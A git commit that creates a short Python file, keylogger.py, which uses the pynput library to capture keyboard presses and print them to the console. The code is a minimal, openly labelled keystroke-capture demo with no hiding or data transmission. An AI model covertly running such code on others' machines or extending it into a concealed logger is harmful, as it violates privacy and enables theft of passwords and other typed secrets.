4cb97b480acf694da5ab0e75c0f964046930a706
AMINE <86064325+SAJIDAMINE@users.noreply.github.com>
2022-08-11 23:43:34 +0100

    Create keylogger.py

---
+++ keylogger.py
@@ -0,0 +1,8 @@
+#install pynput library first with this command: pip install pynput 
+import pynput.keyboard
+
+def process_key_press(key):
+    print(key)
+keyboard_listener = pynput.keyboard.Listener(on_press=process_key_press)
+with keyboard_listener:
+    keyboard_listener.join()
